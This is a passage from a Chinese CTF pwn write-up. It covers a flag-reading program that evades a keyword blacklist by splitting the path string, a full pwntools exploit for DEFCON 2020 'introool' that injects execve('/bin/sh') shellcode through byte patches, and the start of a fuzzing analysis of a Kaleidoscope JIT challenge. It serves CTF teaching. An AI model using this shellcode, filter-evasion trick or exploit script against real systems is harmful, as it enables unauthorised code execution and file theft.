根据题目信息回显，可以发现，题目应该是存在有黑名单机制，那么我们不考虑启动`shell`，转而考虑使用`ORW`的方式获取`flag`，那么最简单的程序：
    #include
    int main(){
        char buf[50]; 
        char path[50] = "/home/ctf/flagx00"; 
        int fd = open(path);
        read(fd,buf,50);
        write(1,buf,50);
    }@
可以发现被过滤了，那么考虑黑名单应该会检测整段代码，以防止出现`home`、`ctf`、`flag`等敏感字符，那么我们可以利用`string`函数进行字符串的拼接来绕过保护。
###  FInal Exploit
    #include
    #include
    int main(){
        char buf[50]; 
        char path_part_1[5] = "/hom"; 
        char path_part_2[5] = "e/ct"; 
        char path_part_3[5] = "f/fl"; 
        char path_part_4[5] = "agx00"; 
        char path[20];
        sprintf(path, "%s%s%s%s", path_part_1, path_part_2, path_part_3, path_part_4);
        int fd = open(path);
        read(fd,buf,50);
        write(1,buf,50);
    }@
## 0x06 以 DEFCON CTF Qualifier 2020 introool 为例
> 题目地址：
###  题目信息
无二进制文件，拉取项目直接启动`docker`即可
  1. 题目要求首先给出一个用于填充的字符，要求这个字符必须大于等于`0x80`。
  2. 接下来要求给出填充的长度，这个长度要求介于`0x80`~`0x800`之间。
  3. 接下来询问要`patch`哪个地址处的字节，用于`patch`的字符是什么。
  4. 接下来再次询问要`patch`哪个地址处的字节，用于`patch`的字符是什么。
  5. 最后要求给出三个`ROP gadgets`。
  6. 在我们给定了以上参数之后，程序会生成一个`ELF`文件，我们可以运行它，也可以查看其内容。
生成的`ELF`文件仅开启了`NX`保护
经过反编译我们可以看到，我们的`patch`是从`0x4000EC`，也就是`main +
4`处开始，最短填充至`0x40016C`，`main`函数对应的汇编码就为：
    push rbp
    mov  rbp,rsp
    [patch data]
    mov  eax,0
    pop  rbp
    ret
然后我们写入的三个`ROP_gadgets`将会被写入到`bss`段。
栈上将填满环境变量，这将导致我们正常情况下的`main`函数返回值将会是一个非法值。
###  漏洞利用
那么对于这道题目，我们利用的是`ELF`文件的一个特性：
**当数据段未页对齐时，其中的内容将也被映射到`text`段的末尾。**
也就是说，对于这个题目来说，位于`bss`段的`ROP_gadgets`将会被映射到`text`段中，
那么，如果我们将`ROP_gadgets`替换为`shellcode`，再利用`patch`加入跳转指令，跳转至`shellcode`即可。
可以使用`ret rel8`形式的跳转，这种跳转的通常为`EB XX`，例如本题应该使用`EB 46`代表的汇编语句是`jmp
0x48`，但是，这里的`0x48`是相对地址，相对于 **本条地址** 的偏移，例如我们将`0x40068`处的代码改为`jmp
0x48`，反汇编后，这里的代码将显示为`jmp 0x4001B0`。
那么，我们接下来直接去`exploit-db`寻找好用的`shellcode`即可：
    0000000000400080 :
      400080:    50                       push   %rax
      400081:    48 31 d2                 xor    %rdx,%rdx
      400084:    48 31 f6                 xor    %rsi,%rsi
      400087:    48 bb 2f 62 69 6e 2f     movabs $0x68732f2f6e69622f,%rbx
      40008e:    2f 73 68 
      400091:    53                       push   %rbx
      400092:    54                       push   %rsp
      400093:    5f                       pop    %rdi
      400094:    b0 3b                    mov    $0x3b,%al
      400096:    0f 05                    syscall
###  FInal Exploit
    from pwn import *
    import traceback
    import sys
    import base64
    context.log_level='debug'
    context.arch='amd64'
    # context.arch='i386'
    # file_name=ELF('./file_name', checksec = False)
    if context.arch == 'amd64':
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec = False)
    elif context.arch == 'i386':
        try:
            libc=ELF("/lib/i386-linux-gnu/libc.so.6", checksec = False)
        except:
            libc=ELF("/lib32/libc.so.6", checksec = False)
    def get_sh(Use_other_libc = False , Use_ssh = False):
        global libc
        if args['REMOTE'] :
            if Use_other_libc :
                libc = ELF("./", checksec = False)
            if Use_ssh :
                s = ssh(sys.argv[3],sys.argv[1], sys.argv[2],sys.argv[4])
                return s.process("./file_name")
            else:
                return remote(sys.argv[1], sys.argv[2])
        else:
            return process("./file_name")
    def get_address(sh,info=None,start_string=None,address_len=None,end_string=None,offset=None,int_mode=False):
        if start_string != None:
            sh.recvuntil(start_string)
        if int_mode :
            return_address = int(sh.recvuntil(end_string,drop=True),16)
        elif address_len != None:
            return_address = u64(sh.recv()[:address_len].ljust(8,'x00'))
        elif context.arch == 'amd64':
            return_address=u64(sh.recvuntil(end_string,drop=True).ljust(8,'x00'))
        else:
            return_address=u32(sh.recvuntil(end_string,drop=True).ljust(4,'x00'))
        if offset != None:
            return_address = return_address + offset
        if info != None:
            log.success(info + str(hex(return_address)))
        return return_address
    def get_flag(sh):
        sh.sendline('cat /flag')
        return sh.recvrepeat(0.3)
    def get_gdb(sh,gdbscript=None,stop=False):
        gdb.attach(sh,gdbscript=gdbscript)
        if stop :
            raw_input()
    def Multi_Attack():
        # testnokill.__main__()
        return
    def Attack(sh=None,ip=None,port=None):
        if ip != None and port !=None:
            try:
                sh = remote(ip,port)
            except:
                return 'ERROR : Can not connect to target server!'
        try:
            # Your Code here
            sh.recvuntil('> ')
            sh.sendline('90') # NOP byte
            sh.recvuntil('> ')
            sh.sendline('80') # NOP size
            sh.recvuntil(': ')
            sh.sendline('7C') # patch offset
            sh.recvuntil(': ')
            sh.sendline('EB') # patch value
            sh.recvuntil(': ')
            sh.sendline('7D') # patch offset
            sh.recvuntil(': ')
            sh.sendline('46') # patch value
            sh.recvuntil('[1/3] > ')
            sh.sendline('504831d24831f648') # ROP
            sh.recvuntil('[2/3] > ')
            sh.sendline('bb2f62696e2f2f73') # ROP
            sh.recvuntil('[3/3] > ')
            sh.sendline('6853545fb03b0f05') # ROP 
            sh.recvuntil('> ')
            # sh.sendline('1') # Watch
            # open('./introool','w').write(base64.b64decode(sh.recvuntil('n',drop=True)))
            sh.sendline('2') # Attack
            sh.interactive()
            flag=get_flag(sh)
            sh.close()
            return flag
        except Exception as e:
            traceback.print_exc()
            sh.close()
            return 'ERROR : Runtime error!'
    if __name__ == "__main__":
        sh = get_sh()
        flag = Attack(sh=sh)
        log.success('The flag is ' + re.search(r'flag{.+}',flag).group())
## 0x07 以 [Redhat2019] Kaleidoscope 为例
> 题目地址：
###  题目信息
没有开启`Canary`和`RELRO`保护的`64`位程序
通过试运行的结果，可以确定这是一个解释器
当我们把它加载到`IDA`中时，我们就可以很明显的看出，此程序使用了`C++`语言编写，并且在编译时启用了一些`LLVM`的优化选项，使得我们的代码识读变得十分困难，我们可以通过题目名以及一些题目中的固定字符串去发现，这是一个`Kaleidoscope`即时解释器，`LLVM`项目将其作为例程来表示如何去构建一个即时解释器，我们可以在
[Building a JIT: Starting out with
KaleidoscopeJIT](https://llvm.org/docs/tutorial/BuildingAJIT1.html)
找到这个例程的解释，同时可以在 [llvm-kaleidoscope](https://github.com/ghaiklor/llvm-kaleidoscope) 处找到该项目的源码。
该项目的`main`函数源码是形如这样子的：
    int main() {
        BinopPrecedence[' ");
        getNextToken();
        TheModule = llvm::make_unique("My awesome JIT",     TheContext);
        MainLoop();
        TheModule->print(errs(), nullptr);
        return 0;
    }
但是本题的`main`函数的反编译结果却是：
这种代码会令人十分的难以去理解，但是通过比较这两段代码可以发现，这段代码额外的定义了一个`=`操作符，一般情况下，这种额外的定义往往会伴随着漏洞的发生，但是由于此处的代码分析量实在是过于庞杂，因此我们此处考虑使用`fuzz`的思路。
###  `fuzz`测试
此处我们决定使用`honggfuzz`这个模糊测试工具，这是一个由`Google`维护的一个`fuzz`工具。
#### 安装`honggfuzz`(以`ubuntu 16.04`为例)